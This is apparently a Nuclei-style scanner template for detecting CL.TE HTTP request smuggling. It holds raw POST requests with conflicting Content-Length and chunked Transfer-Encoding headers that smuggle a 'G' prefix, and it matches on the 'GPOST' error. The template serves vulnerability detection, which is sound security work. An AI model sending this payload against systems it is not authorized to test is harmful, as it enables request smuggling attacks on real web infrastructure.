http:
- matchers:
  - dsl:
    - contains(body_2, "Unrecognized method GPOST")
    type: dsl
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Connection: keep-alive

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 6

    Transfer-Encoding: chunked


    0


    G


    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Connection: keep-alive

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 6

    Transfer-Encoding: chunked


    0


    G


    '
  unsafe: true
id: cl-te-http-smuggling
info:
  author: pdteam,akincibor
  description: 'Detected a potential CL.TE request smuggling condition where conflicting
    Content-Length and Transfer-Encoding headers caused the gateway and backend to
    parse requests differently.

    '
  metadata:
    max-request: 2
    verified: true
  name: Basic CL.TE - HTTP request smuggling
  reference:
  - https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
  severity: low
  tags: cl-te,smuggling
